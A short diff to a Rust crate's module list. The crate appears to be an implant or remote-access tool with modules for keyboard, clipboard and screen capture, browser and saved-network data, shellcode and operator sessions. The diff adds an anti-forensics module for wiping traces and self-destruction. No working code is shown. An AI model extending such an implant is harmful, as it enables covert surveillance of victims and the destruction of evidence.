@@ -28,6 +28,8 @@
 //!   netinfo  the network configuration of the host
 //!   sessions interactive sessions (a process the operator writes to)
 //!   desktop the screen, the clipboard and the keyboard
+//!   forensics the surface of the implant, the wipe of the traces and
+//!            the self-destruction
 //!   senses  the senses of the desktop: the window table, the clipboard,
 //!           the screen in motion, the saved networks, the browsers, the
 //!           security software, the USB keys and the memory of a process
@@ -61,6 +63,7 @@ pub mod remote;
 pub mod s3;
 pub mod script;
 pub mod senses;
+pub mod forensics;
 pub mod session;
 pub mod sessions;
 pub mod shellcode;
